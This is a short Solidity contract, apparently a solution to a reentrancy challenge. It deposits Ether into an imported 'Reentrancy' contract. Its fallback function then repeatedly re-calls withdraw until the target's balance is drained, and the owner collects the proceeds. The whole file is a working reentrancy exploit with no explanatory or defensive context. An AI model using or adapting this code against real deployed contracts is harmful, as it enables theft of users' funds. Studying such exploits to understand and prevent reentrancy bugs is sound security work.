// SPDX-License-Identifier: MIT

pragma solidity ^0.6.12;

import "./Reentrancy.sol";

contract ReentrancyAttack {
    Reentrancy public reentrancy;
    address payable public owner;

    modifier onlyOwner {
        require(msg.sender == owner, "Only the owner can collect");
        _;
    }

    constructor(address payable _reentrancyAddres) public {
        reentrancy = Reentrancy(_reentrancyAddres);
        owner = msg.sender;
    }

    function attack() public payable {
        require(msg.value > 0);
        reentrancy.donate{value: msg.value}(address(this));
        reentrancy.withdraw(msg.value);
    }

    function collect() public onlyOwner {
        owner.transfer(address(this).balance);
    }

    fallback() external payable {
        if (address(reentrancy).balance >= msg.value) {
            reentrancy.withdraw(msg.value);
        }
    }
}
